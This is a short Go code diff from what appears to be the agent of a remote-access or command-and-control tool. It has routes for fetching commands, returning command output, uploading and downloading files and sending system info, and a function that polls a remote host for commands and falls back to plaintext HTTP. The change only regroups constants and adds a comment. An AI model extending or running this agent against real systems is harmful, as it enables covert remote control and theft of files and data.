@@ -18,11 +18,13 @@ import (
 //go:generate go-bindata -o cert.go ../cert/server.crt
 
 // routes
-const getCmdURL = "/getcmd"
-const cmdOutputURL = "/cmdoutput"
-const uploadFileURL = "/upload"
-const downloadFileURL = "/download"
-const sysInfoURL = "/sysinfo"
+const (
+	getCmdURL       = "/getcmd"
+	cmdOutputURL    = "/cmdoutput"
+	uploadFileURL   = "/upload"
+	downloadFileURL = "/download"
+	sysInfoURL      = "/sysinfo"
+)
 
 // special errors
 var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")
@@ -81,6 +83,7 @@ func RequestCommand(client *http.Client, host string, port int) (string, string)
 	if err != nil {
 		log.Printf("[-] Got error when requesting cmd: %s\nRetrying in 5 seconds...\n", err)
 		if err == ErrHTTPResponse {
+			// try with plaintext HTTP
 			hasTLS = false
 		}
 		time.Sleep(5 * time.Second)
